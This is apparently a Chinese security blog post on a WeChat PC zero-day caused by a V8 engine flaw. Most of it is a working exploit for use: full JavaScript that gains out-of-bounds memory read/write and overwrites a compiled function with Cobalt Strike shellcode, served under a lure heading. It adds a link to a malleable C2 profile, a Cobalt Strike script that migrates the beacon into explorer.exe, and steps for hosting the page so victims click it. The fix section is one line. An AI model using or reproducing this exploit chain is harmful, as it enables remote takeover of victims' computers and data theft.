WX--zeroday



免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!
转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
一：漏洞描述
此次微信漏洞由于内置浏览器使用google生态导致，漏洞利用简单，危害性级别高，攻击者向用户在微信上发送一条经过精心构造的恶意链接，PC 版用户只要点击后，shellcode（恶意代码的一种）即会启动，用户的电脑可被完全控制，造成信息泄露、木马中毒等后果。

二: 漏洞影响
根据腾讯安全中心的公告，这是因为 chrome 浏览器使用的 V8 引擎存在安全问题导致的。该漏洞仅影响 windows 版本的 PC 版微信，且只影响 3.2.1.141 以下版本。

三: 漏洞复现
使用cs生成x86的payload放置在需要加载的js中，这里提供一个tools大佬写的html,shellcode中放置生成的x86的c#payload,。（cs如何生成shellcode此处不演示）

```python
<head>

<meta http-equiv="Content-Type" content="text/html;charset=utf-8">

</head>

<h1>来，宝，给你看个好东西</h1>

<script>
ENABLE_LOG = true;

IN_WORKER = true;



// run calc and hang in a loop

var shellcode = [];



function print(data) {

}





var not_optimised_out = 0;

var target_function = (function (value) {

    if (value == 0xdecaf0) {

        not_optimised_out += 1;

    }

    not_optimised_out += 1;

    not_optimised_out |= 0xff;

    not_optimised_out *= 12;

});



for (var i = 0; i < 0x10000; ++i) {

    target_function(i);

}





var g_array;

var tDerivedNCount = 17 * 87481 - 8;

var tDerivedNDepth = 19 * 19;



function cb(flag) {

    if (flag == true) {

        return;

    }

    g_array = new Array(0);

    g_array[0] = 0x1dbabe * 2;

    return 'c01db33f';

}



function gc() {

    for (var i = 0; i < 0x10000; ++i) {

        new String();

    }

}



function oobAccess() {

    var this_ = this;

    this.buffer = null;

    this.buffer_view = null;



    this.page_buffer = null;

    this.page_view = null;



    this.prevent_opt = [];



    var kSlotOffset = 0x1f;

    var kBackingStoreOffset = 0xf;



    class LeakArrayBuffer extends ArrayBuffer {

        constructor() {

            super(0x1000);

            this.slot = this;

        }

    }



    this.page_buffer = new LeakArrayBuffer();

    this.page_view = new DataView(this.page_buffer);



    new RegExp({ toString: function () { return 'a' } });

    cb(true);



    class DerivedBase extends RegExp {

        constructor() {

            // var array = null;

            super(

                // at this point, the 4-byte allocation for the JSRegExp `this` object

                // has just happened.

                {

                    toString: cb

                }, 'g'

                // now the runtime JSRegExp constructor is called, corrupting the

                // JSArray.

            );



            // this allocation will now directly follow the FixedArray allocation

            // made for `this.data`, which is where `array.elements` points to.

            this_.buffer = new ArrayBuffer(0x80);

            g_array[8] = this_.page_buffer;

        }

    }



    // try{

    var derived_n = eval(`(function derived_n(i) {

        if (i == 0) {

            return DerivedBase;

        }



        class DerivedN extends derived_n(i-1) {

            constructor() {

                super();

                return;

                ${"this.a=0;".repeat(tDerivedNCount)}

            }

        }



        return DerivedN;

    })`);



    gc();





    new (derived_n(tDerivedNDepth))();



    this.buffer_view = new DataView(this.buffer);

    this.leakPtr = function (obj) {

        this.page_buffer.slot = obj;

        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);

    }



    this.setPtr = function (addr) {

        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);

    }



    this.read32 = function (addr) {

        this.setPtr(addr);

        return this.page_view.getUint32(0, true, ...this.prevent_opt);

    }



    this.write32 = function (addr, value) {

        this.setPtr(addr);

        this.page_view.setUint32(0, value, true, ...this.prevent_opt);

    }



    this.write8 = function (addr, value) {

        this.setPtr(addr);

        this.page_view.setUint8(0, value, ...this.prevent_opt);

    }



    this.setBytes = function (addr, content) {

        for (var i = 0; i < content.length; i++) {

            this.write8(addr + i, content[i]);

        }

    }

    return this;

}



function trigger() {

    var oob = oobAccess();



    var func_ptr = oob.leakPtr(target_function);

    print('[*] target_function at 0x' + func_ptr.toString(16));



    var kCodeInsOffset = 0x1b;



    var code_addr = oob.read32(func_ptr + kCodeInsOffset);

    print('[*] code_addr at 0x' + code_addr.toString(16));



    oob.setBytes(code_addr, shellcode);



    target_function(0);

}



try{

    print("start running");

    trigger();

}catch(e){

    print(e);

}

</script>
```
但是经过测试发现该方法点击后会话极易掉线，并且关闭浏览器会话便消失，这里提供另一位大佬的方法，加载自定义 malleable C2 配置文件，将sleep时间修改为1秒，然后加载一个直接将会话迁移到explorer.exe中的cna脚本，操作如下：
下载已经写好的配置文件（大佬已经写好的）：https://www.ailiqun.xyz/images/jquery-c2.4.0.profile
将该配置文件放在cs服务端中，启用的时候在末尾加上这个配置文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420203129741.png)
启用后加载一个 Cobalt Strike automigrate 自动迁移进程的插件，将下面的代码保存为cna加载到客户端的cs中

```python
on beacon_initial
{
 sub callback
 {
  $regex = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+';
  $listener = "test";
  if ($2  ismatch $regex)
  {
   $pid = matched()[1];
   $inject_pid = $pid;
   if (-is64 $1)
   {
    $arch = "x64";
   }
   else
   {
    $arch = "x86";
   }
   binject($1, $pid, $listener, $arch);
  }
 }
 if($inject_pid != beacon_info($1,"pid"))
 {
  bps($1, &callback);
 }
}
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420203343997.png)
##测试上线
有vps的可以简单在服务器上开个python服务，命令为`python -m SimpleHTTPServer port`，将需要点击的html放入服务器中产生连接进行点击即可上线，自动生成一个explorer的会话。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420203746553.png)
四: 修复方法：升级官方发布的最新版本即可

参考连接：https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/
https://www.t00ls.net/viewthread.php?tid=60463&extra=&page=1